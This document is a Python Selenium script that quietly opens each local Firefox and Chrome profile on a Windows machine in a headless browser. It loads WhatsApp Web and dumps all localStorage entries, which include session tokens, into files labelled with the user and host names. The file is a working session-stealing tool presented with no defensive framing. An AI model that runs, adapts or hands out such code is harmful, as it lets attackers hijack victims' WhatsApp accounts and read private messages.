from selenium import webdriver
import selenium.common.exceptions as webexcept
from selenium.webdriver.firefox.options import Options as fireOptions
import os
import socket
import getpass
import platform

pc = socket.gethostname()
name = getpass.getuser()


def get(key=None):
    # noinspection PyGlobalUndefined
    global driver
    if key:
        return driver.execute_script("return window.localStorage.getItem('{}')".format(key))
    else:
        return driver.execute_script("""
        var items = {}, ls = window.localStorage;
        for (var i = 0, k; i < ls.length; i++)
          items[k = ls.key(i)] = ls.getItem(k);
        return items;
        """)


if platform.system() == "Windows":
    gotChrome = True
    gotFirefox = True
    profileList = []
    appDir = []
    fireOptions = fireOptions()
    fireOptions.set_preference
    fireOptions.set_headless(headless=True)
    chromeOptions = webdriver.ChromeOptions()
    chromeOptions.set_headless(headless=True)
    try:
        driver = webdriver.Firefox(options=fireOptions)
        driver.quit()
    except webexcept.WebDriverException:
        gotFirefox = False
    try:
        driver = webdriver.Chrome(options=chromeOptions)
        driver.quit()
    except webexcept.WebDriverException:
        gotChrome = False

    if not os.path.isdir("saves"):
        os.mkdir("saves")

    if gotFirefox:
        windir = os.listdir(os.environ['APPDATA'] + '\Mozilla\Firefox\Profiles')
        for profile in windir:
            fireProfile = webdriver.FirefoxProfile(os.environ['APPDATA'] + '\Mozilla\Firefox\Profiles' + '\\' + profile)
            driver = webdriver.Firefox(fireProfile, options=fireOptions)
            driver.get('https://web.whatsapp.com/')
            for key, value in get().items():
                with open("saves\\" + ("%s@%s-Firefox_%s.lwa" % (str(name), str(pc), str(profile))), "ab") as file:
                    try:
                        file.write(key + ': ' + value + '\n')
                    except UnicodeEncodeError:
                        pass
        driver.quit()

    if gotChrome:
        options = webdriver.ChromeOptions()
        windir = os.environ['USERPROFILE'] + '\Appdata\Local\Google\Chrome\User Data'
        profileList.append("")
        for profileDir in os.listdir(windir):
            if "Profile" in profileDir:
                if profileDir != "System Profile":
                    profileList.append(profileDir)
        for profile in profileList:
            options.add_argument('user-data-dir=%s' % windir + '\\' + profile)
            options.set_headless(headless=True)
            driver = webdriver.Chrome(chrome_options=options)
            driver.get('https://web.whatsapp.com/')
            for key, value in get().items():
                with open("saves\\" + ("%s@%s-Chrome_%s.lwa" % (str(name), str(pc), str(profile))), "ab") as file:
                    try:
                        file.write(key + ': ' + value + '\n')
                    except UnicodeEncodeError:
                        pass
        driver.quit()
